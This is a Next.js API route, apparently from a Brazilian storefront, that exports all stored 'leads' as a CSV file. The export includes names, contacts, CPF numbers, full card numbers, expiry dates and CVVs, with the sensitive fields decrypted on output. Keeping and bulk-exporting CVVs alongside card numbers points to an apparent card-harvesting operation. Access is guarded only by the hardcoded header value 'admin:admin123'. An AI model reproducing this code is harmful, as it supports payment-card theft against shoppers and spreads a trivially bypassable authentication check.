import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { decrypt } from "@/lib/crypto";

export async function GET(req: NextRequest) {
  const auth = req.headers.get("x-admin-auth");
  if (auth !== "admin:admin123") {
    return NextResponse.json({ error: "Não autorizado" }, { status: 401 });
  }

  try {
    const leads = await prisma.lead.findMany({
      orderBy: { dataCriacao: "desc" },
    });

    const headers = [
      "ID",
      "Nome",
      "Email",
      "Telefone",
      "CPF",
      "NumeroCartao",
      "Validade",
      "CVV",
      "Cor",
      "Quantidade",
      "TotalPago",
      "CEP",
      "Endereco",
      "Cidade",
      "Estado",
      "DataCriacao",
    ];

    const rows = leads.map((l) => [
      l.id,
      `"${l.nome}"`,
      l.email,
      l.telefone,
      decrypt(l.cpf),
      decrypt(l.numeroCartao),
      l.validade,
      decrypt(l.cvv),
      l.corSelecionada,
      l.quantidade,
      l.totalPago,
      l.cep || "",
      `"${l.endereco || ""}"`,
      l.cidade || "",
      l.estado || "",
      l.dataCriacao.toISOString(),
    ]);

    const csv = [headers.join(","), ...rows.map((r) => r.join(","))].join("\n");

    return new NextResponse(csv, {
      status: 200,
      headers: {
        "Content-Type": "text/csv; charset=utf-8",
        "Content-Disposition": `attachment; filename="leads-${new Date().toISOString().slice(0, 10)}.csv"`,
      },
    });
  } catch (error) {
    console.error("Export error:", error);
    return NextResponse.json({ error: "Erro ao exportar" }, { status: 500 });
  }
}
